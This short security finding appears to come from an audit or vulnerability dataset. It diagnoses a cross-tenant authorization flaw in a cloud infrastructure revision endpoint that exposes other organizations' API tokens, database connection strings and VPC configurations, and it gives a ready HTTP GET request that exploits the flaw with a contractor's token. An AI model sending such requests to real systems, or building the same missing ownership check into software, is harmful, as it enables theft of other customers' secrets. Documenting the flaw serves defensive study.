diagnosis: CloudInfraRevisionDetailView queries Revision directly by primary key without checking if the associated versioned models belong to request.user.organization. The response serializes raw field_dict snapshots, exposing infrastructure topology, API tokens, database connection strings, and VPC subnet configurations of other organizations.
exploit_request:
GET /api/infra/revisions/5012/ HTTP/1.1
Host: cloudmgr.devops-hub.io
Authorization: Bearer <contractor_token>
Accept: application/json
